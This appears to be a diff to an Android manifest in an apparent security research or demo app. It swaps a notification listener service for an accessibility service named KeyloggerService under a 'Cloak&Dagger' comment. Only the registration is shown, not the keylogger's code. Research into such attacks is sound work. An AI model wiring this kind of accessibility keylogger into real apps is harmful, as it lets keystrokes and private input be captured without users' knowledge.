@@ -104,13 +104,17 @@
         <activity android:name=".smsToken.TokenSms" />
         <activity android:name=".report.ExtendedReportActivity" />
         <activity android:name=".smsToken.DefaultSms" />
-        <service android:name=".smsToken.NLService"
-            android:label="notification_service_sarna"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+
+        <!-- Cloak&Dagger accessibility service -->
+        <activity android:name=".cloak_and_dagger.CloakAndDaggerActivity" />
+        <service android:name=".cloak_and_dagger.KeyloggerService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
             </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_meta"/>
         </service>
+
     </application>
 
 </manifest>
